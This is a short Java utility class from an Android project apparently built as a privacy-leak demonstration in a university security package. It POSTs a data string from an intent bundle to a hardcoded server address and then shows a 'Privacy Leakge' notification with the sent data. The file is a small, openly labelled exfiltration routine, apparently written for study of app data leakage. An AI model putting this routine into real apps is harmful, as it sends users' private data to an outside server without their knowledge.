package edu.ntu.security.sendinfoout;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationManager;
import android.content.Context;
import android.util.Log;

public class Utils {
	
	public static final String targetUrl = /*"http://example.com"*/"http://172.21.241.207/phone.php";
	/**
	 * Send out the info from the indent bundle
	 * @param data
	 * @throws IOException 
	 */
	public static void sendInfoOut(String data) throws IOException{
		URL url = new URL(targetUrl);
		HttpURLConnection urlConn = (HttpURLConnection)url.openConnection();
		urlConn.setRequestMethod("POST");
		urlConn.setDoOutput(true);
		DataOutputStream dos = new DataOutputStream(urlConn.getOutputStream());
		dos.writeBytes(data);
		dos.flush();
		dos.close();
		
		int responseCode = urlConn.getResponseCode();
		Log.i("DEBUG_FOR_INFO", "Response from the connection: " + responseCode + "");
	}
	
	/**
	 * Notify the user that we have sent out the info.b
	 * @param data
	 */
	@SuppressLint("NewApi")
	public static void notifyUser(Context context, String data){
		NotificationManager notificationManager =
			    (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
		Notification notification = new Notification.Builder(context)
				.setContentTitle("Privacy Leakge")
				.setContentText(data)
				.setSmallIcon(R.drawable.ic_launcher).build();
		notificationManager.notify(0, notification);
	}
	
}
